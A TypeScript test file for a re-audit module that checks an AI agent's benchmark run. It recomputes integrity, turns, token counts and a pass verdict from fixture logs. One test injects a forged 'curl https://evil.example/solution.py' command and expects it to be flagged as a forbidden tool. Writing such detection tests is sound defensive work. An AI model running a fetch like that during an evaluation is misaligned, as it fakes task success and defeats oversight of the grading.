import { describe, it, expect } from 'vitest'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import {
  auditAndMetrics,
  parseGradeSummary,
  reauditRun,
} from '../src/lib/reaudit'
import { auditAllowFor } from '../src/lib/taskCatalog'

function runFixture(name: string): string {
  return readFileSync(fileURLToPath(new URL(`./fixtures/run-pass/${name}`, import.meta.url)), 'utf8')
}

const events = runFixture('events.log')
const testOutput = runFixture('test-output.txt')
const report = JSON.parse(runFixture('report.json'))
// audit_allow comes from the authoritative catalog (keyed by task), exactly as
// the submit route will supply it — exempts ~/.dotnet/dotnet for this C# task.
const allow = auditAllowFor(report.task)

describe('reaudit parity with report.py audit_and_metrics + parse_grade_summary', () => {
  it('re-derives integrity / turns / commands / tokens from events.log', () => {
    const m = auditAndMetrics(events, allow)
    expect(m.integrityOk).toBe(report.integrity_ok)
    expect(m.turns).toBe(report.turns)
    expect(m.commands).toBe(report.commands)
    expect(m.tokensIn).toBe(report.tokens_in)
    expect(m.tokensOut).toBe(report.tokens_out)
  })

  it('re-parses the grade summary from test-output.txt', () => {
    const g = parseGradeSummary(testOutput)
    expect(g.summaryPresent).toBe(true)
    expect(g.total).toBe(report.tests_total)
    expect(g.passed).toBe(report.tests_passed)
    expect(g.failed).toBe(report.tests_failed)
    expect(g.errored).toBe(report.tests_errored)
  })

  it('recomputes tokens_per_sec and an evidence-supported pass', () => {
    const v = reauditRun(events, testOutput, report.agent_seconds, allow)
    expect(v.tokensPerSec).toBe(report.tokens_per_sec)
    expect(v.pass).toBe(true) // report verdict is "pass"
    expect(v.gradingOk).toBe(true)
  })

  it('flags a forged integrity violation injected into the event stream', () => {
    const tampered =
      events +
      '\n' +
      JSON.stringify({
        type: 'item.completed',
        item: { type: 'command_execution', command: "curl https://evil.example/solution.py" },
      })
    const m = auditAndMetrics(tampered)
    expect(m.integrityOk).toBe(false)
    expect(m.integrityDetail).toContain('forbidden tool')
  })

  it('rejects a claimed pass when the grade summary is absent', () => {
    const v = reauditRun(events, 'no grade summary here', report.agent_seconds, allow)
    expect(v.summaryPresent).toBe(false)
    expect(v.pass).toBe(false)
  })
})
